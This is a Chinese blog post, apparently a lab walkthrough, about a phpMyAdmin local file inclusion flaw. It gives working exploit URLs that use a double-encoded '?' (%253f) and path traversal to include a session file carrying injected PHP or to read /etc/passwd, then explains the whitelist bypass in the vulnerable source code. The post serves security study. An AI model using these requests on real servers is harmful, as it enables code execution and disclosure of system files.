<!DOCTYPE html><html class="han-init" lang="zh-Hant"><head><meta name="generator" content="Hexo 3.9.0"><meta name="author" content="John Doe"><meta name="description" itemprop="description" content="实验步骤登陆进入phpMyadmin点击SQL执行  select ‘‘在网页上打开开发者工具在Elements所属行点击Application,在左侧列中找到Session Storage 中的Cookies,找到phpMyadmin的网址，这样session id就为Value值。在本机浏览器打"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>phpadmin文件包含漏洞</title><link rel="stylesheet" type="text/css" href="/font/fantasque_sans_mono/stylesheet.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/webicons/2.0.0/webicons.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/Han/3.3.0/han.min.css"><link rel="stylesheet" type="text/css" href="/styles/screen.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/highlight.js/9.9.0/styles/gruvbox-dark.min.css"></head><body><header><a href="/"><img class="logo" src="/images/avatar.gif" alt="昵称不可为空" title="昵称不可为空"></a><h1><a href="/" alt="昵称不可为空" title="昵称不可为空">昵称不可为空</a></h1><p></p><nav><ul><li><a href="/" alt="首页" title="首页">首页</a></li><li><a href="/pigeonhole" alt="归档" title="归档">归档</a></li><li><a href="/links" alt="链接" title="链接">链接</a></li><li><a href="/about" alt="关于" title="关于">关于</a></li></ul><div class="xnews-icon"><a target="_blank" href="/atom.xml">&#xe621;</a><a target="_blank" href="https://github.com/YOUR_GITHUB_ID" style="position: relative; top: -2px;">&#xe735;</a><a target="_blank" href="https://twitter.com/YOUR_TWITTER_ID">&#xe71f;</a><a target="_blank" href="https://www.facebook.com/YOUR_FACEBOOK_ID">&#xe60b;</a><a target="_blank" href="https://www.zhihu.com/people/YOUR_ZHIHU_ID">&#xe63f;</a><a target="_blank" href="https://weibo.com/YOUR_WEIBO_ID" style="position: relative; top: -2px;">&#xe603;</a></div></nav><div class="space"></div></header><main><article class="full"><h1>phpadmin文件包含漏洞</h1><span class="post-meta">写于<time> 2019 年 07 月 28 日 21 时 18 分</time><br>更新于<time> 2019 年 07 月 28 日 21 时 26 分</time></span><div class="article-toc"><strong>大纲</strong><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#实验步骤"><span class="toc-number">1.</span> <span class="toc-text">实验步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sessionID文件常见路径"><span class="toc-number">1.1.</span> <span class="toc-text">sessionID文件常见路径</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞细节"><span class="toc-number">2.</span> <span class="toc-text">漏洞细节</span></a></li></ol></div><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>登陆进入phpMyadmin<br>点击SQL执行  select ‘<?php phpinfo();exit;?>‘<br>在网页上打开开发者工具在Elements所属行点击Application,在左侧列中找到Session Storage 中的Cookies,找到phpMyadmin的网址，这样session id就为Value值。<br>在本机浏览器打开  虚拟机ip/phpMyAdmin(/var/www/html下你的phpMyadmin名字)/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_你的Value值。就可以成功利用该漏洞。</p>
<p>以下也可以成功执行<br>虚拟机ip/phpMyAdmin(/var/www/html下你的phpMyadmin名字)/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</p>
<h3 id="sessionID文件常见路径"><a href="#sessionID文件常见路径" class="headerlink" title="sessionID文件常见路径"></a>sessionID文件常见路径</h3><p>在Linux下，常见的文件路径为： /var/lib/php/session/<br>在Windows下：<br>phpstudy集成软件环境下，文件路径为：<br>/phpstudy/PHPTutorial/tmp/tmp<br>Wamp集成软件环境下，文件路径为：<br>/wamp64/tmp</p>
<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>/var/www/html/phpmyadmin<br>vim index.php</p>
<p>50 $target_blacklist = array (<br>51 ‘import.php’, ‘export.php’<br>52 );<br>不能在$target_blacklist数组内。</p>
<p>55 if (! empty($_REQUEST[‘target’])<br>56     &amp;&amp; is_string($_REQUEST[‘target’])<br>57     &amp;&amp; ! preg_match(‘/^index/‘, $_REQUEST[‘target’])<br>58     &amp;&amp; ! in_array($_REQUEST[‘target’], $target_blacklist)<br>59     &amp;&amp; Core::checkPageValidity($_REQUEST[‘target’])<br>60 ) {<br>61     include $_REQUEST[‘target’];<br>62     exit;<br>63 }<br>这里的target 可以直接传值输入。我们可以传入一个本地文件路径去让其包含，就会造成LFI漏洞。<br>首先，我们满足4个条件：<br>1．传入的target 需要是一个字符串。<br>2．不能以/index/ 开头。</p>
<p>需要满足checkPageValidity函数要求。<br>cd /var/www/html/phpmyadmin/libraries/classes/Core.php</p>
<p>443     public static function checkPageValidity(&amp;$page, array $whitelist = [])<br>444     {<br>445         if (empty($whitelist)) {<br>446             $whitelist = self::$goto_whitelist;<br>447         }<br>448         if (! isset($page) || !is_string($page)) {<br>449             return false;<br>450         }<br>451<br>452         if (in_array($page, $whitelist)) {<br>453             return true;<br>// 这里的$page在in_array之前没有经过任何的修饰，直接就与$whitelist作比较。没有办法绕过，传入的target值只能为白名单里的文件名才行。很明显，第一个并不能利用。<br>454         }<br>455<br>456         $_page = mb_substr(<br>457             $page,<br>458             0,<br>459             mb_strpos($page . ‘?’, ‘?’)<br>460         );<br>461         if (in_array($_page, $whitelist)) {<br>462             return true;<br>// mb_strpos()函数的意思是查找字符串在另一个字符串中首次出现的位置。<br>mb_substr()函数的意思是：从$str字符串中，提取从$start位置开始，长度为$length的字符串。可以看出，第二个可以返回ture，我们利用db_sql.php?/../../格式就可以达到目的，绕过白名单限制。但是include ‘db_sql.php?/../../../aaa.txt’不能跨路径包含。</p>
<p>463         }<br>464<br>465         $_page = urldecode($page);<br>466         $_page = mb_substr(<br>467             $_page,<br>468             0,<br>469             mb_strpos($_page . ‘?’, ‘?’)<br>470         );<br>471         if (in_array($_page, $whitelist)) {<br>472             return true;<br>//第三个和第二个对比多出了个urldecode()函数。<br>我们可以利用双重编码绕过，将?经过两次编码%253f就可以绕过白名单验证。<br>%253f 传入时，首先会被自动解码一次，变成%3f。然后urldecode()再解码一次，就变成了 ?。 成功绕过了白名单限制。<br>这种情况下include的包含情况就是这样的，也就可以任意包含本地文件了。<br>include  db_sql.php%3f/../../../aaa.txt<br>473         }<br>474<br>475         return false;<br>476     }<br>函数有三处返回ture的地方，只要有任意一处返回ture就可以。这三处，有一个共同点，都是需要$page在$whitelist数组中内才会返回true。</p>
<hr><section class="comment"><div id="disqus_thread"></div></section><script>var DISQUS_PAGE_URL = "http://yoursite.com/2019/07/28/phpadmin文件包含漏洞/";</script><script>var DISQUS_IDENTIFIER = "2019/07/28/phpadmin文件包含漏洞/";</script><script>var DISQUS_SHORT_NAME = "YOUR_DUOSHUO_ID"</script><script>var disqus_config = function() {
  this.page.url = DISQUS_PAGE_URL;
  this.page.identifier = DISQUS_IDENTIFIER;
};

(function() {
  var d = document, s = d.createElement("script");
  s.src = "https://" + DISQUS_SHORT_NAME + ".disqus.com/embed.js";
  s.setAttribute("data-timestamp", +new Date());
  (d.head || d.body).appendChild(s);
})();</script><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript><footer><section class="copyright">&copy; 2016 - 2019<a href="/">John Doe</a></section><section class="intro">由<a href="https://hexo.io/">Hexo</a>驱动&middot;挂载<a href="https://github.com/xadillax/hexo-xnew">X'new</a>主题</section></footer></article></main><script src="//cdn.bootcss.com/Han/3.3.0/han.min.js"></script><script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script><script src="//cdn.bootcss.com/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script><script src="/scripts/highlight.pack.js"></script><script>$(function() {
    $("header").backstretch("/images/header.jpeg");

    $("figure.highlight").each(function(i, block) {
        $(block).removeClass("highlight");
        $("<pre><code class='__tobehl " + ($(block).attr("class") === "plain" ? "" : ("lang-" + $(block).attr("class"))) + "'></code></pre>").insertAfter($(block));
        $(block).next().find("code").text((block.innerText || block.textContent));
        $(block).remove();
    });
    $(".__tobehl").each(function(i, block) {
        hljs.highlightBlock(block);
    });

    $("article.full img").each(function() {
        $(this).parent().css("text-align", "center");
    });

    if($(".article-toc").children().length < 2) {
        $(".article-toc").css("display", "none");
    }
});</script></body></html>